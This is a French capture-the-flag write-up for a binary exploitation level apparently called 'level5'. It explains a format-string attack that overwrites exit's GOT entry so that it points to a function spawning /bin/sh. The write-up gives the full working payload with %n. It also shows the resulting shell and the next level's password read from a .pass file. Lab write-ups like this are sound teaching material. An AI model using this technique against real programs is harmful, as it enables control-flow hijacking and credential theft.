#### Etape 1: Décompilation / Compréhension du programme.

Le programme appelle une fonction *n()*
Celle-ci contient un fgets, et un printf avec lequel elle appel une variable char[520] et pour finir une fonction exit(1).
Nous voyons aussi dans ce binaire une autre fonction o() qui elle appel notre sytem('/bin/sh').

#### Etape 2: Identification des vulnérabilités

Notre probleme ici est que nous n'avons pas de variable globale a modifier pour obtenir le flag et nous exitons après le printf et donc pas de retour.
Sinon on répère les mêmes vulnérabilités que dans le précédent level.

#### Etape 3 : Plan d'attaque

Notre plan d'attaque va donc être de modifier l'adresse de exit de la fonction *n()* pour qu'elle pointe sur la fonction *o()* grâce au %n qui modifie la variable, elle devient le nombre de caractères écris auparavant.

#### Etape 4 : Récolte d'informations

Il va donc falloir trouver l'adresse de la fonction (nommée *exit* dans le binaire). Sur Ghidra nous voyons plusieurs adresse possible :
- 0x080484ff qui est l'adresse de la fonction exit dans la fonction n().(mais celle ci est appelée par la fonction exit)
- 0x0804a014 qui est une adresse intermediare de la fonction exit qui appel.
- 0x080483d0 qui est la fonction qui appel exit 
- 0x08049838 qui est l'adresse de la fonction exit dans la library de fonction.

Notre idee donc et de modifier la valeur de base de exit pour qu'elle pointe sur la fonction o() donc nous utilisons l'adresse 0x08049838.

Il faut ensuite trouver a quel moment dans la stack la valeur que nous écrivons est appelée.

```bash
python -c 'print "aaaa" + "%x "*4' | ./level5
aaaa200 b7fd1ac0 b7ff37d0 61616161
```

Notre valeur est donc la 4eme adresse.

l'adresse de la fonction o() est 0x080484a4 et en decimal est 134513828.

Nous devrons donc écrire 134513828 caractére a la 4e adresse, Il existe une syntaxe comme dans grep pour passer directement a la 4e adresse : 4$.

l'adress de exit est 0x08049838 en little endian cela donne \x38\x98\x04\x08.

#### Etape 5 : Execution

```bash
(python -c 'print "\x38\x98\x04\x08" + "%134513824x" + "%4$n"'; cat -) | ./level5
[...] ca prend pas mal de temps [...] mais a la fin nous arrivons dans un bash [...]
                              200
whoami
level6
cat /home/user/level6/.pass
d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31
```

